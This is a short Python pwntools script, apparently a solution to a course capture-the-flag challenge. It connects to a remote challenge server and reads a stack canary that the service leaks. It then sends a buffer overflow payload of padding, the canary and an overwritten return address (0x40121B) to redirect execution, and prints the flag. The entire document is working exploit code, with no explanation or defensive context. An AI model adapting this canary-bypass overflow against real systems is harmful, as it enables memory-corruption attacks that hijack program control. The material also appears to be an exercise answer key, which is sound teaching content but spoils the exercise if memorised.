#!/usr/bin/python3

from pwn import *
from pwn import p64

io = remote('inf226.puffling.no', 7002)
io.recvuntil(b'? ')
io.sendline(b'24') 

r = io.recvline()
canary = r.removeprefix(b"Here's a hint: ")

io.recvline()
io.send(cyclic(24) + p64(int(canary, 16)) + cyclic(8) + p64(0x40121B)) 
io.shutdown()


recieved = io.recvall().decode()
flag = recieved.splitlines()[-2]
print(f'Flag 02: {flag}')

